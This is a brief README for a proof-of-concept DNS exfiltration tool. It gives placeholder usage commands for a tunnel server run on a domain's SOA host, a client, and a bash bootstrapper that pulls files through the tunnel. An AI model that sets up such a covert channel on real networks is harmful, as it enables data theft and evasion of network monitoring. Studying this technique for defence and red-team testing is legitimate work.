# DNS-Exfil
PoC DNS exfiltration tool with bash bootstrap and file transfer functions<br>
<br>
the dns tunnel server is intended to run on a server which can be the<br>
the SOA for a domain or subdomain.<br>
<br>
on the server:<br>
# python dnstun.py --domain [SOA record name]<br>
<br>
on the client:<br>
$ ./client -s [SOA record name]<br>
<br>
downloading a file name "test" from the server using the bash bootstrapper<br>
./bootstrap_file_transfer.sh test<br>

